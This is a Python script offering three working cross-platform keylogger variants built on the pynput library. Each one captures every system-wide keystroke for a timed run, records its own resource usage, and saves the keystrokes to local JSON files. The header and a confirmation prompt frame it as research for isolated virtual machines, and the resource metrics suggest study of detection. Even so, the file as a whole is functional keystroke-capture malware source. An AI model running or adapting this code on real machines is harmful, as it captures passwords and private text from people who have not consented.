"""
Cross-Platform Keylogger Variants for Research
Works on Windows, macOS, and Linux
WARNING: Use ONLY in isolated VM environments for research purposes
"""

import time
import threading
import json
import platform
from datetime import datetime
from pynput import keyboard
import psutil

# Get current platform
CURRENT_PLATFORM = platform.system()

# ============================================================================
# VARIANT 1: Global Hook (pynput - cross-platform)
# ============================================================================
class GlobalHookKeylogger:
    """Uses pynput global keyboard hook (works on all platforms)"""
    
    def __init__(self, log_file="keylog_variant1.json"):
        self.log_file = log_file
        self.is_running = False
        self.listener = None
        self.logs = {
            "variant": "global_hook",
            "platform": CURRENT_PLATFORM,
            "start_time": None,
            "keystrokes": [],
            "system_metrics": []
        }
    
    def on_press(self, key):
        """Callback for key press events"""
        try:
            entry = {
                "timestamp": time.time(),
                "key": str(key),
                "type": "press"
            }
            self.logs["keystrokes"].append(entry)
        except Exception as e:
            print(f"Error logging key: {e}")
    
    def collect_metrics(self):
        """Collect system metrics while running"""
        while self.is_running:
            try:
                process = psutil.Process()
                metrics = {
                    "timestamp": time.time(),
                    "cpu_percent": process.cpu_percent(interval=0.5),
                    "memory_mb": process.memory_info().rss / (1024 * 1024),
                    "threads": process.num_threads(),
                }
                
                # Add Windows-specific metric if available
                if CURRENT_PLATFORM == "Windows":
                    try:
                        metrics["handles"] = process.num_handles()
                    except:
                        metrics["handles"] = 0
                else:
                    metrics["handles"] = 0
                
                self.logs["system_metrics"].append(metrics)
            except:
                pass
            time.sleep(2)
    
    def start(self, duration_seconds=60):
        """Start keylogger for specified duration"""
        print(f"[Variant 1] Starting Global Hook Keylogger for {duration_seconds}s...")
        print(f"[Platform: {CURRENT_PLATFORM}]")
        self.is_running = True
        self.logs["start_time"] = datetime.now().isoformat()
        
        # Start metrics collection thread
        metrics_thread = threading.Thread(target=self.collect_metrics)
        metrics_thread.start()
        
        # Start keyboard listener
        try:
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
        except Exception as e:
            print(f"Error starting listener: {e}")
        
        try:
            time.sleep(duration_seconds)
        except KeyboardInterrupt:
            pass
        finally:
            self.stop()
            metrics_thread.join()
    
    def stop(self):
        """Stop keylogger and save logs"""
        self.is_running = False
        if self.listener:
            try:
                self.listener.stop()
            except:
                pass
        
        with open(self.log_file, 'w') as f:
            json.dump(self.logs, f, indent=2)
        
        print(f"[Variant 1] Logged {len(self.logs['keystrokes'])} keystrokes to {self.log_file}")


# ============================================================================
# VARIANT 2: Polling Method (Windows-optimized, but with fallback)
# ============================================================================
class PollingKeylogger:
    """Polling-based keylogger with platform adaptation"""
    
    def __init__(self, log_file="keylog_variant2.json"):
        self.log_file = log_file
        self.is_running = False
        self.logs = {
            "variant": "polling",
            "platform": CURRENT_PLATFORM,
            "start_time": None,
            "keystrokes": [],
            "system_metrics": []
        }
        self.pressed_keys = set()
        
        # Use pynput for cross-platform compatibility
        self.listener = None
    
    def on_press(self, key):
        """Callback for polling simulation"""
        try:
            key_str = str(key)
            if key_str not in self.pressed_keys:
                self.pressed_keys.add(key_str)
                entry = {
                    "timestamp": time.time(),
                    "key": key_str,
                    "type": "press",
                    "method": "polling_simulation"
                }
                self.logs["keystrokes"].append(entry)
        except:
            pass
    
    def on_release(self, key):
        """Track key releases"""
        try:
            key_str = str(key)
            self.pressed_keys.discard(key_str)
        except:
            pass
    
    def collect_metrics(self):
        """Collect system metrics while running"""
        while self.is_running:
            try:
                process = psutil.Process()
                metrics = {
                    "timestamp": time.time(),
                    "cpu_percent": process.cpu_percent(interval=0.5),
                    "memory_mb": process.memory_info().rss / (1024 * 1024),
                    "threads": process.num_threads()
                }
                
                if CURRENT_PLATFORM == "Windows":
                    try:
                        metrics["handles"] = process.num_handles()
                    except:
                        metrics["handles"] = 0
                else:
                    metrics["handles"] = 0
                
                self.logs["system_metrics"].append(metrics)
            except:
                pass
            time.sleep(2)
    
    def start(self, duration_seconds=60):
        """Start keylogger for specified duration"""
        print(f"[Variant 2] Starting Polling Keylogger for {duration_seconds}s...")
        print(f"[Platform: {CURRENT_PLATFORM}]")
        print("[Note: Using pynput-based polling simulation for cross-platform compatibility]")
        
        self.is_running = True
        self.logs["start_time"] = datetime.now().isoformat()
        
        # Start metrics thread
        metrics_thread = threading.Thread(target=self.collect_metrics)
        metrics_thread.start()
        
        # Start listener for polling simulation
        try:
            self.listener = keyboard.Listener(
                on_press=self.on_press,
                on_release=self.on_release
            )
            self.listener.start()
        except Exception as e:
            print(f"Error starting listener: {e}")
        
        try:
            time.sleep(duration_seconds)
        except KeyboardInterrupt:
            pass
        finally:
            self.stop()
            metrics_thread.join()
    
    def stop(self):
        """Stop keylogger and save logs"""
        self.is_running = False
        if self.listener:
            try:
                self.listener.stop()
            except:
                pass
        
        with open(self.log_file, 'w') as f:
            json.dump(self.logs, f, indent=2)
        
        print(f"[Variant 2] Logged {len(self.logs['keystrokes'])} keystrokes to {self.log_file}")


# ============================================================================
# VARIANT 3: Simple Hook (Basic Implementation)
# ============================================================================
class SimpleHookKeylogger:
    """Simplified keyboard hook for comparison"""
    
    def __init__(self, log_file="keylog_variant3.json"):
        self.log_file = log_file
        self.is_running = False
        self.listener = None
        self.logs = {
            "variant": "simple_hook",
            "platform": CURRENT_PLATFORM,
            "start_time": None,
            "keystrokes": [],
            "system_metrics": []
        }
    
    def on_press(self, key):
        """Callback for key press events"""
        try:
            # Try to get character
            try:
                char = key.char
            except AttributeError:
                char = str(key)
            
            entry = {
                "timestamp": time.time(),
                "key": char,
                "type": "press"
            }
            self.logs["keystrokes"].append(entry)
        except Exception as e:
            pass
    
    def collect_metrics(self):
        """Collect system metrics while running"""
        while self.is_running:
            try:
                process = psutil.Process()
                metrics = {
                    "timestamp": time.time(),
                    "cpu_percent": process.cpu_percent(interval=0.5),
                    "memory_mb": process.memory_info().rss / (1024 * 1024),
                    "threads": process.num_threads()
                }
                
                if CURRENT_PLATFORM == "Windows":
                    try:
                        metrics["handles"] = process.num_handles()
                    except:
                        metrics["handles"] = 0
                else:
                    metrics["handles"] = 0
                
                self.logs["system_metrics"].append(metrics)
            except:
                pass
            time.sleep(2)
    
    def start(self, duration_seconds=60):
        """Start keylogger for specified duration"""
        print(f"[Variant 3] Starting Simple Hook Keylogger for {duration_seconds}s...")
        print(f"[Platform: {CURRENT_PLATFORM}]")
        self.is_running = True
        self.logs["start_time"] = datetime.now().isoformat()
        
        # Start metrics collection
        metrics_thread = threading.Thread(target=self.collect_metrics)
        metrics_thread.start()
        
        # Start keyboard listener
        try:
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
        except Exception as e:
            print(f"Error starting listener: {e}")
        
        try:
            time.sleep(duration_seconds)
        except KeyboardInterrupt:
            pass
        finally:
            self.stop()
            metrics_thread.join()
    
    def stop(self):
        """Stop keylogger and save logs"""
        self.is_running = False
        if self.listener:
            try:
                self.listener.stop()
            except:
                pass
        
        with open(self.log_file, 'w') as f:
            json.dump(self.logs, f, indent=2)
        
        print(f"[Variant 3] Logged {len(self.logs['keystrokes'])} keystrokes to {self.log_file}")


# ============================================================================
# Test Runner
# ============================================================================
if __name__ == "__main__":
    print("="*70)
    print("CROSS-PLATFORM KEYLOGGER VARIANTS - RESEARCH ONLY")
    print(f"Platform: {CURRENT_PLATFORM}")
    print("WARNING: Use only in isolated VM environment!")
    print("="*70)
    
    # Confirm environment
    confirm = input("\nAre you in an isolated VM/test environment? (yes/no): ")
    if confirm.lower() != 'yes':
        print("❌ Aborted. Use only in isolated environments.")
        exit()
    
    # Test each variant
    test_duration = 30  # 30 seconds each
    
    print("\n--- Testing Variant 1: Global Hook ---")
    variant1 = GlobalHookKeylogger()
    variant1.start(test_duration)
    
    print("\n--- Testing Variant 2: Polling ---")
    variant2 = PollingKeylogger()
    variant2.start(test_duration)
    
    print("\n--- Testing Variant 3: Simple Hook ---")
    variant3 = SimpleHookKeylogger()
    variant3.start(test_duration)
    
    print("\n" + "="*70)
    print("All variants tested. Check output files for results.")
    print("="*70)